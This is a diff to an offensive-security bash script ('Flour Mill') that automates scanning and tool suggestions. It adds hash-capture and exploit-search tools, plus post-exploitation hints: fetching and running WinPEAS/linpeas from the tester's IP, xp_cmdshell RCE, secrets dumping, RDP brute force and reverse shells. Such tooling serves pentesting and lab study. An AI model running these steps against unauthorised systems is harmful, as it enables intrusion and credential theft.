@@ -18,7 +18,7 @@ TIMESTAMP=$(date +%Y%m%d_%H%M%S)
 start_time=$(date +%s)
 SCAN_TYPE=""
 os=""
-VERSION="2.5"
+VERSION="3.0"
 
 # update check
 if [[ "$1" == "--update" || "$1" == "-u" ]]; then
@@ -87,7 +87,7 @@ banner() {
     ||      ||
 
                         ╔═══════════════════════════════╗
-                        ║     Flour Mill v2.5           ║
+                        ║     Flour Mill v3.0           ║
                         ║   scan → parse → exploit      ║
                         ╚═══════════════════════════════╝
 EOF
@@ -110,7 +110,9 @@ check_deps() {
         "impacket-mssqlclient:mssql client"
         "enum4linux-ng:smb enum"
         "smbclient:smb client"
+        "smbmap:smb shares"
         "netexec:protocol testing"
+        "responder:hash capture"
         "hydra:bruteforce"
         "medusa:bruteforce"
         "nikto:web scanner"
@@ -125,7 +127,7 @@ check_deps() {
         "sqlmap:sqli"
         "ssh-audit:ssh check"
         "msfconsole:metasploit"
-        "responder:poisoner"
+        "searchsploit:exploit db"
         "ldapsearch:ldap"
         "dig:dns"
         "dnsenum:dns enum"
@@ -328,6 +330,15 @@ install_missing() {
                 ;;
             whatweb)
                 sudo apt install -y whatweb 2>/dev/null
+                ;;
+            smbmap)
+                sudo apt install -y smbmap 2>/dev/null
+                ;;
+            searchsploit)
+                sudo apt install -y exploitdb 2>/dev/null
+                ;;
+            responder)
+                sudo apt install -y responder 2>/dev/null
                 ;;
             dirsearch)
                 sudo apt install -y dirsearch 2>/dev/null || {
@@ -658,6 +669,7 @@ get_tools() {
             [[ "$svc" =~ netbios|microsoft-ds|smb ]] && {
                 echo "enum4linux-ng|smb enum|enum4linux-ng -A $TARGET"
                 echo "smbclient|shares|smbclient -L //$TARGET -N"
+                echo "smbmap|share enum|smbmap -H $TARGET"
                 echo "netexec|smb test|netexec smb $TARGET -u '' -p ''"
                 echo "impacket-secretsdump|dump secrets|impacket-secretsdump DOMAIN/user:pass@$TARGET"
                 echo "impacket-psexec|remote exec|impacket-psexec DOMAIN/user:pass@$TARGET"
@@ -717,6 +729,107 @@ get_tools() {
     esac
 }
 
+# show next steps / privesc hints based on service
+show_next_steps() {
+    p=$1
+    svc=$2
+    
+    echo -e "\n${BLU}╔════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${BLU}║${NC}${YEL}                   NEXT STEPS                          ${NC}${BLU}║${NC}"
+    echo -e "${BLU}╚════════════════════════════════════════════════════════╝${NC}"
+    
+    case $p in
+        139|445)
+            if [[ "$svc" =~ netbios|microsoft-ds|smb ]]; then
+                echo -e "\n${YEL}If you get creds or a shell:${NC}"
+                echo "  1. List shares: smbmap -H $TARGET -u user -p pass"
+                echo "  2. Check for vulns: searchsploit $svc" 
+                
+                if [[ "$os" == "windows" ]]; then
+                    echo -e "\n${YEL}Windows box - privesc steps:${NC}"
+                    # only suggest if we have the tool
+                    if command -v wget &>/dev/null; then
+                        echo "  1. Get WinPEAS on target:"
+                        echo "     wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
+                        echo "  2. Transfer it: impacket-smbserver share . -smb2support"
+                        echo "  3. On target: copy \\\\YOUR_IP\\share\\winPEASx64.exe ."
+                        echo "  4. Run: .\\winPEASx64.exe"
+                    fi
+                    echo -e "\n${YEL}Look for:${NC}"
+                    echo "  → Unquoted service paths"
+                    echo "  → Weak file permissions"
+                    echo "  → AlwaysInstallElevated"
+                    echo "  → Saved credentials"
+                fi
+            fi
+            ;;
+        22)
+            if [[ "$svc" =~ ssh ]]; then
+                echo -e "\n${YEL}Once you have SSH access:${NC}"
+                
+                if [[ "$os" == "linux" ]] || [[ -z "$os" ]]; then
+                    echo "  1. Start web server locally: python3 -m http.server 8000"
+                    # check if we can suggest linpeas
+                    if command -v wget &>/dev/null || command -v curl &>/dev/null; then
+                        echo "  2. On target: wget http://YOUR_IP:8000/linpeas.sh"
+                        echo "  3. Run: chmod +x linpeas.sh && ./linpeas.sh"
+                    fi
+                    
+                    echo -e "\n${YEL}Quick manual checks:${NC}"
+                    echo "  sudo -l"
+                    echo "  find / -perm -4000 2>/dev/null"
+                    echo "  cat /etc/crontab"
+                    echo "  ls -la /home"
+                    
+                    echo -e "\n${YEL}Look for:${NC}"
+                    echo "  → SUID binaries (check GTFOBins)"
+                    echo "  → Sudo misconfigurations"
+                    echo "  → Writable cron jobs"
+                    echo "  → Passwords in history/config files"
+                fi
+            fi
+            ;;
+        80|443|8080|8443)
+            if [[ "$svc" =~ http|https ]]; then
+                echo -e "\n${YEL}Found a web app - common next steps:${NC}"
+                echo "  1. Check for known CMS/framework vulns"
+                echo "  2. Look for: /admin, /login, /.git, /backup"
+                echo "  3. Try default creds if you find a login"
+                
+                if has_tool "searchsploit"; then
+                    echo "  4. Search exploits: searchsploit [cms name]"
+                fi
+                
+                echo -e "\n${YEL}If you get RCE or file upload:${NC}"
+                echo "  → Get a reverse shell"
+                echo "  → Then run privesc enumeration (see above)"
+            fi
+            ;;
+        3389)
+            if [[ "$svc" =~ rdp ]]; then
+                echo -e "\n${YEL}RDP is open:${NC}"
+                echo "  1. Try known default creds first"
+                echo "  2. Use hydra if you have a user list"
+                echo "  3. Check for BlueKeep (CVE-2019-0708) if old Windows"
+                
+                if has_tool "searchsploit"; then
+                    echo "  4. Search: searchsploit rdp"
+                fi
+            fi
+            ;;
+        1433)
+            if [[ "$svc" =~ mssql ]]; then
+                echo -e "\n${YEL}MSSQL found:${NC}"
+                echo "  1. Try default sa account"
+                echo "  2. If you get in: xp_cmdshell for RCE"
+                echo "  3. Then WinPEAS for privesc (see SMB section above)"
+            fi
+            ;;
+    esac
+    
+    echo ""
+}
+
 run_tools() {
     while read line; do
         p=$(echo "$line" | awk '{print $1}' | cut -d'/' -f1)
@@ -774,6 +887,9 @@ run_tools() {
                 echo -e "${YEL}skip${NC}"
             fi
         done <<< "$sugg"
+        
+        # show what to do next based on the service
+        show_next_steps "$p" "$svc"
         
         echo ""
         
